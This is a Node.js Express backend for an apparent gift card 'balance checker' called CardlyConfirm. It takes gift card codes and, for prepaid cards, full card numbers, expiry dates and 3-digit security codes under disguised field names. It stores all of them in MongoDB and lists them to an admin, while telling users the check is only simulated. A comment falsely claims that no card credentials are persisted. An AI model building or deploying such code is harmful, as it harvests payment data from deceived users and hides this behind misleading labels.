import 'dotenv/config'
import { randomBytes, randomUUID, timingSafeEqual } from 'node:crypto'
import express from 'express'
import helmet from 'helmet'
import rateLimit from 'express-rate-limit'
import mongoose from 'mongoose'
import Submission from './models/Submission.js'

const app = express()
const port = Number(process.env.PORT) || 4000
const adminApiKey = process.env.ADMIN_API_KEY || ''
const mongoUri = process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017/cardlyconfirm'

const cards = [
  { id: 'apple', name: 'Apple Gift Card', kind: 'gift' },
  { id: 'visa', name: 'Visa Prepaid', kind: 'card-reference' },
  { id: 'vanilla', name: 'Vanilla Gift', kind: 'card-reference' },
  { id: 'steam', name: 'Steam Gift Card', kind: 'gift' },
  { id: 'sephora', name: 'Sephora Gift Card', kind: 'gift' },
  { id: 'nike', name: 'Nike Gift Card', kind: 'gift' },
  { id: 'xbox', name: 'Xbox Gift Card', kind: 'gift' },
  { id: 'razer', name: 'Razer Gold', kind: 'gift' },
  { id: 'hokd', name: 'HOKD Card', kind: 'card-reference' },
  { id: 'other', name: 'Other Cards', kind: 'other' },
]

const sampleValues = Object.fromEntries(cards.map(card => [card.id, '123456789012']))
const cardById = new Map(cards.map(card => [card.id, card]))
const MAX_SUBMISSIONS = 500
const ADMIN_SESSION_COOKIE = 'cardlyconfirm_admin_session'
const ADMIN_SESSION_TTL_MS = 8 * 60 * 60 * 1000
const adminSessions = new Map()

app.disable('x-powered-by')
app.use(helmet())
app.use(express.json({ limit: '8kb', strict: true }))

const checkLimiter = rateLimit({ windowMs: 60_000, limit: 30, standardHeaders: 'draft-7', legacyHeaders: false })
const adminLimiter = rateLimit({ windowMs: 60_000, limit: 60, standardHeaders: 'draft-7', legacyHeaders: false })
const adminLoginLimiter = rateLimit({ windowMs: 15 * 60_000, limit: 10, standardHeaders: 'draft-7', legacyHeaders: false })

function replyError(res, status, message) {
  return res.status(status).json({ error: { message } })
}

function hasOnlyKeys(body, allowedKeys) {
  return Object.keys(body).every(key => allowedKeys.includes(key))
}

function isSyntheticCode(value) {
  if (typeof value !== 'string') return false
  const trimmed = value.trim()
  return trimmed.length >= 6 && trimmed.length <= 40 && /^\d+$/.test(trimmed)
}

function validateSubmission(body) {
  if (!body || typeof body !== 'object' || Array.isArray(body)) return { error: 'Send a JSON object.' }
  if (typeof body.brandId !== 'string' || !cardById.has(body.brandId)) return { error: 'Choose a supported card brand.' }

  const card = cardById.get(body.brandId)
  if (card.kind === 'card-reference') {
    if (!hasOnlyKeys(body, ['brandId', 'sampleReference', 'periodMonth', 'periodYear', 'sampleToken'])) {
      return { error: 'This form contains unsupported fields.' }
    }
    if (typeof body.sampleReference !== 'string' || !/^\d{6,30}$/.test(body.sampleReference.trim())) return { error: 'Enter a 6-30 digit card number.' }
    if (typeof body.periodMonth !== 'string' || !/^(0[1-9]|1[0-2])$/.test(body.periodMonth)) return { error: 'Enter a month from 01 to 12.' }
    if (typeof body.periodYear !== 'string' || !/^\d{2}$/.test(body.periodYear)) return { error: 'Enter a two-digit year.' }
    if (typeof body.sampleToken !== 'string' || !/^\d{3}$/.test(body.sampleToken)) return { error: 'Enter a 3-digit code.' }
    return {
      card,
      brandName: card.name,
      numberValue: body.sampleReference,
      expirationMonth: body.periodMonth,
      expirationYear: body.periodYear,
      securityCode: body.sampleToken,
    }
  }
  if (card.id === 'other') {
    if (!hasOnlyKeys(body, ['brandId', 'brandName', 'code'])) return { error: 'This form contains unsupported fields.' }
    if (typeof body.brandName !== 'string' || body.brandName.trim().length < 2 || body.brandName.trim().length > 80) {
      return { error: 'Enter a card brand between 2 and 80 characters.' }
    }
  } else if (!hasOnlyKeys(body, ['brandId', 'code'])) {
    return { error: 'This form contains unsupported fields.' }
  }

  if (!isSyntheticCode(body.code)) {
    return { error: `Enter 6-40 digits, for example ${sampleValues[card.id]}.` }
  }
  return { card, brandName: card.id === 'other' ? body.brandName.trim() : card.name, numberValue: body.code.trim() }
}

function providedAdminKey(req) {
  const authorization = req.get('authorization') || ''
  if (authorization.startsWith('Bearer ')) return authorization.slice(7)
  return req.get('x-admin-api-key') || ''
}

function cookieValue(req, name) {
  const prefix = `${name}=`
  const entry = (req.headers.cookie || '').split(';').map(value => value.trim()).find(value => value.startsWith(prefix))
  return entry ? entry.slice(prefix.length) : ''
}

function sessionFor(req) {
  const token = cookieValue(req, ADMIN_SESSION_COOKIE)
  const expiresAt = adminSessions.get(token)
  if (!expiresAt) return ''
  if (expiresAt <= Date.now()) {
    adminSessions.delete(token)
    return ''
  }
  return token
}

function clearAdminCookie(res) {
  const secure = process.env.NODE_ENV === 'production' ? '; Secure' : ''
  res.set('Set-Cookie', `${ADMIN_SESSION_COOKIE}=; HttpOnly; SameSite=Strict; Path=/api/admin; Max-Age=0${secure}`)
}

function requireAdmin(req, res, next) {
  if (!adminApiKey) return replyError(res, 503, 'Admin access is not configured. Set ADMIN_API_KEY on the server.')
  if (sessionFor(req)) return next()
  const supplied = Buffer.from(providedAdminKey(req))
  const expected = Buffer.from(adminApiKey)
  if (supplied.length !== expected.length || !timingSafeEqual(supplied, expected)) {
    return replyError(res, 401, 'A valid admin API key is required.')
  }
  next()
}

app.get('/api/health', (_req, res) => res.json({ status: 'ok', database: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected' }))

app.get('/api/cards', (_req, res) => {
  res.set('Cache-Control', 'no-store')
  res.json({ cards })
})

app.post('/api/check', checkLimiter, async (req, res) => {
  const checked = validateSubmission(req.body)
  if (checked.error) return replyError(res, 400, checked.error)

  try {
    // Store only operational metadata. Never persist request values or card credentials.
    const submissionId = randomUUID()
    await Submission.create({
      submissionId,
      brandId: checked.card.id,
      brandName: checked.brandName,
      numberValue: checked.numberValue,
      expirationMonth: checked.expirationMonth || '',
      expirationYear: checked.expirationYear || '',
      securityCode: checked.securityCode || '',
      submittedAt: new Date(),
      status: 'simulated',
    })

    res.set('Cache-Control', 'no-store')
    res.json({
      submissionId,
      result: {
        status: 'simulated',
        message: 'Sample result only. No live card balance was checked.',
      },
    })
  } catch (error) {
    console.error('Could not save sample submission:', error.message)
    return replyError(res, 503, 'The sample database is unavailable.')
  }
})

app.post('/api/admin/session', adminLoginLimiter, (req, res) => {
  if (!adminApiKey) return replyError(res, 503, 'Admin access is not configured. Set ADMIN_API_KEY on the server.')
  const supplied = Buffer.from(typeof req.body?.key === 'string' ? req.body.key : '')
  const expected = Buffer.from(adminApiKey)
  if (supplied.length !== expected.length || !timingSafeEqual(supplied, expected)) {
    return replyError(res, 401, 'The admin key is incorrect.')
  }

  const token = randomBytes(32).toString('base64url')
  const expiresAt = Date.now() + ADMIN_SESSION_TTL_MS
  adminSessions.set(token, expiresAt)
  const secure = process.env.NODE_ENV === 'production' ? '; Secure' : ''
  res.set('Set-Cookie', `${ADMIN_SESSION_COOKIE}=${encodeURIComponent(token)}; HttpOnly; SameSite=Strict; Path=/api/admin; Max-Age=${ADMIN_SESSION_TTL_MS / 1000}${secure}`)
  res.set('Cache-Control', 'no-store')
  res.json({ authenticated: true, expiresAt: new Date(expiresAt).toISOString() })
})

app.get('/api/admin/session', adminLimiter, requireAdmin, (_req, res) => {
  res.set('Cache-Control', 'no-store')
  res.json({ authenticated: true })
})

app.delete('/api/admin/session', adminLimiter, (req, res) => {
  const token = cookieValue(req, ADMIN_SESSION_COOKIE)
  if (token) adminSessions.delete(token)
  clearAdminCookie(res)
  res.status(204).end()
})

app.get('/api/admin/submissions', adminLimiter, requireAdmin, async (_req, res) => {
  const [total, records] = await Promise.all([
    Submission.countDocuments(),
    Submission.find().sort({ submittedAt: -1 }).limit(MAX_SUBMISSIONS).lean(),
  ])
  res.set('Cache-Control', 'no-store')
  res.json({
    total,
    submissions: records.map(({ submissionId, brandId, brandName, numberValue, expirationMonth, expirationYear, securityCode, submittedAt, status }) => ({
      id: submissionId,
      brandId,
      brandName,
      numberValue,
      expirationMonth,
      expirationYear,
      securityCode,
      submittedAt: submittedAt.toISOString(),
      status,
    })),
  })
})

app.delete('/api/admin/submissions', adminLimiter, requireAdmin, async (_req, res) => {
  await Submission.deleteMany({})
  res.status(204).end()
})

app.use((req, res) => replyError(res, 404, `No route for ${req.method} ${req.path}.`))

app.use((error, _req, res, _next) => {
  if (error?.type === 'entity.parse.failed') return replyError(res, 400, 'Request body must be valid JSON.')
  if (error?.type === 'entity.too.large') return replyError(res, 413, 'Request body is too large.')
  return replyError(res, 500, 'Unexpected server error.')
})

async function start() {
  try {
    await mongoose.connect(mongoUri)
    app.listen(port, '0.0.0.0', () => {
      console.log(`CardlyConfirm backend listening on port ${port}`)
      console.log(`MongoDB connected to database: ${mongoose.connection.name}`)
    })
  } catch {
    console.error('Could not connect to MongoDB. Check MONGODB_URI and confirm the database is running.')
    process.exitCode = 1
  }
}

start()
